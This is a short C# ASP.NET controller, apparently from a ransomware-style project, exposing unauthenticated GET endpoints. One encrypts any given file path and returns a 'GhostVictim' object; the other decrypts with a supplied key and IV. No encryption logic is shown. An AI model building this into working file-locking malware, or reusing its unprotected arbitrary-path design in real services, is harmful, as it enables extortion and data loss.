using GhostApi.Interfaces;
using GhostApi.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace GhostApi.Controllers
{
    [Route("API/[controller]")]
    [ApiController]
    public class GhostController : ControllerBase
    {
        private readonly IGhostService _ghostService;
        public GhostController(IGhostService ghostService)
        {
            _ghostService = ghostService;
        }

        [HttpGet("Encrypt")]
        public GhostVictim Encrypt(string filePath)
        {
            return _ghostService.StartEncryption(filePath);
        }
        [HttpGet("Decrypt")]
        public bool Decrypt(string filePath, string key, string iv)
        {
            return _ghostService.StartDecryption(filePath, key, iv);
        }
    }
}
